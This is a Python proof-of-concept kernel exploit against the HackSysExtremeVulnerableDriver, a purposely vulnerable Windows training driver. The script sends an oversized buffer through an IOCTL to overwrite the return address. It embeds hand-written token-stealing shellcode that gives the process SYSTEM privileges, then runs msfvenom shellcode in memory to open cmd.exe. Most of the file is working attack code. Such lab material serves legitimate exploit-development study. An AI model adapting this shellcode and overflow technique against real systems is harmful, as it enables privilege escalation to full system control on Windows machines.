"""

HEVD - Buffer OverFlow Privilege Escalation Exploit
       Python POC by- Chaitanya[@bofheaded]

Big thanks to : Osanda Malith, b33f and Cn33liz :) for helping me with problems i faced while writing my first kernel exploit :D <3

Image poc : https://s26.postimg.org/u93yof9c9/troll.png

"""

from ctypes import *
import struct,os
shellcode = (
        #---[Setup]
        "\x60"                      # pushad
        "\x64\xA1\x24\x01\x00\x00"  # mov eax, fs:[KTHREAD_OFFSET]
        "\x8B\x40\x50"              # mov eax, [eax + EPROCESS_OFFSET]
        "\x89\xC1"                  # mov ecx, eax (Current _EPROCESS structure)
        "\x8B\x98\xF8\x00\x00\x00"  # mov ebx, [eax + TOKEN_OFFSET]
        #---[Copy System PID token]
        "\xBA\x04\x00\x00\x00"      # mov edx, 4 (SYSTEM PID)
        "\x8B\x80\xB8\x00\x00\x00"  # mov eax, [eax + FLINK_OFFSET] <-|
        "\x2D\xB8\x00\x00\x00"      # sub eax, FLINK_OFFSET           |
        "\x39\x90\xB4\x00\x00\x00"  # cmp [eax + PID_OFFSET], edx     |
        "\x75\xED"                  # jnz                           ->|
        "\x8B\x90\xF8\x00\x00\x00"  # mov edx, [eax + TOKEN_OFFSET]
        "\x89\x91\xF8\x00\x00\x00"  # mov [ecx + TOKEN_OFFSET], edx
        #---[Recover]
        "\x61"                      # popad
        "\x31\xC0"                  # NTSTATUS -> STATUS_SUCCESS
        "\x5D"                      # pop ebp
        "\xC2\x08\x00"              # ret 8
    )
def shell_token():
    shellcodePtr = id(shellcode) + 20
    return shellcodePtr
def shell_my_shell():
  # Popping shellcode in memory
  #msfvenom -a x86 -p windows/exec CMD=cmd.exe EXITFUNC=thread -f c > shell.txt
    s2_cmd = ("\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
              "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
              "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
              "\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
              "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
              "\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
              "\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
              "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
              "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
              "\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
              "\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5"
              "\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
              "\x00\x53\xff\xd5\x63\x6d\x64\x2e\x65\x78\x65\x00")
    kk = create_string_buffer(s2_cmd, len(s2_cmd))
    oo = cast(kk, CFUNCTYPE(c_void_p))
    oo()
def get_me_handle():
    """ Grab Device handle """
    print """
    HEVD - Buffer OverFlow Privilege Escalation Exploit
           Python POC by- Chaitanya[@bofheaded]
    """
    print "[~] Geting Device Handle Please Wait...."
    global handle
    handle = windll.kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",0xC0000000,0, None, 0x3, 0, None)
    if handle == -1:
        print "[-]Failed To Get Device Handle :(",handle
        exit()    
    else:
        print "[+] Grabbed Handle : ",handle
        
def overflow_stack():
    #Sending Buffer to IOCTL, saving registers values and poping NT shell
    lpBytesReturned = c_ulong()
    buf = "\x41" * 2080 + struct.pack("<L",shell_token())
    bufSize  = len(buf)
    bufPtr = id(buf) + 20
    r = windll.kernel32.DeviceIoControl(handle, 0x222003, bufPtr, bufSize, None, 0,byref(lpBytesReturned), None)
    print "[+] IOCTL AT : 0x222003"
    print "[*] Trying sending buffer and popping NT Shell ...."
    if r != 1:
        print "[-] Magic Didn't worked :("
        exit()
    else:
        print "[~] Executing Final msfvenom cmdexec shell in memory..."
        shell_my_shell()
        #os.system('cmd.exe')
def main():
    get_me_handle()
    overflow_stack()
if __name__ == "__main__":
    main()
